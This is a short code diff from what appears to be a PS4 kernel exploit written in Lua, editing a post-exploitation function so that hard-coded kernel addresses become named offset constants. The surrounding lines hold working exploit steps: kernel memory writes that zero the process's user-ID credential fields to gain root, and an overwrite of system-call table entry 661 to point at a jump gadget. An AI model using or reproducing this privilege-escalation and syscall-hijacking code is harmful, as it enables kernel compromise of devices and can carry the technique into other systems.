@@ -1731,7 +1731,7 @@ function post_exploitation_ps4()
     
         local proc_fd = kernel.read_qword(curproc + kernel_offset.PROC_FD)
         local ucred = kernel.read_qword(curproc + OFFSET_P_UCRED)
-    
+        
         kernel.write_dword(ucred + 0x04, 0) -- cr_uid
         kernel.write_dword(ucred + 0x08, 0) -- cr_ruid
         kernel.write_dword(ucred + 0x0C, 0) -- cr_svuid
@@ -1756,13 +1756,13 @@ function post_exploitation_ps4()
         local mapping_addr = uint64(0x920100000)
         local shadow_mapping_addr = uint64(0x926100000)
         
-        local sysent_661_addr = kbase + 0x1107f00
+        local sysent_661_addr = kbase + kernel_offset.SYSENT_661_OFFSET
         local sy_narg = kernel.read_dword(sysent_661_addr):tonumber()
         local sy_call = kernel.read_qword(sysent_661_addr + 8):tonumber()
         local sy_thrcnt = kernel.read_dword(sysent_661_addr + 0x2c):tonumber()
 
         kernel.write_dword(sysent_661_addr, 6)
-        kernel.write_qword(sysent_661_addr + 8, kbase + 0x4c7ad)
+        kernel.write_qword(sysent_661_addr + 8, kbase + kernel_offset.JMP_RSI_GADGET)
         kernel.write_dword(sysent_661_addr + 0x2c, 1)
         
         syscall.resolve({
